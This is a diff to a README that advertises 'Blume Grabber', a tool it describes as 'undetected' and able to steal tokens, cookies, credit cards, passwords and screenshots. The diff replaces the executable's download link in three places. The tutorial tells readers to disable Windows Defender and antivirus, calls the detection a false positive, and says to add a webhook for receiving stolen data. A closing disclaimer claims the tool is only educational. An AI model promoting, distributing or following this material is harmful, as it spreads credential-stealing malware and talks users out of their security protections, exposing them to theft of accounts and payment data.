@@ -1,6 +1,6 @@
 # Blume Grabber (updated and undetected 2023/2024)
 Get Tokens, Cookies, Credit Cards, Passwords, Screenshots...
-> [Download](https://www.mediafire.com/file/k00xoeil70hfsh2/BlumeGrabber.exe/file)
+> [Download](https://gofile.io/d/pplX69)
 
 <picture>
   <source srcset="https://i.ibb.co/60yVQrH/Blume-Grabber.png">
@@ -52,7 +52,7 @@ Get Tokens, Cookies, Credit Cards, Passwords, Screenshots...
 - Self Destruct
 
 # Tutorial
-1. Download [Blume Grabber](https://www.mediafire.com/file/k00xoeil70hfsh2/BlumeGrabber.exe/file) 
+1. Download [Blume Grabber](https://gofile.io/d/pplX69) 
 2. Disable your Windows Defender / Antivirus (it's a token grabber, so it's false positive)
 3. Run the software
 4. Insert your webhook
@@ -61,7 +61,7 @@ Get Tokens, Cookies, Credit Cards, Passwords, Screenshots...
 7. (If the software crashes, update .NET Runtime)
 
 # Download
-> [Download](https://www.mediafire.com/file/k00xoeil70hfsh2/BlumeGrabber.exe/file)
+> [Download](https://gofile.io/d/pplX69)
 
 # Disclaimer
 This tool is explicitly designed and provided exclusively for educational intentions. Its primary objective is to illuminate the vulnerabilities that files can be susceptible to, highlighting the need for proactive security measures. It is imperative that this tool is never leveraged for any illegal, unauthorized, or malicious undertakings. Under no circumstances will I assume liability for any detrimental consequences inflicted upon your computing infrastructure. I hereby absolve myself from any complicity in activities of an illicit nature. Emphatically, this tool's utility is confined to didactic objectives.
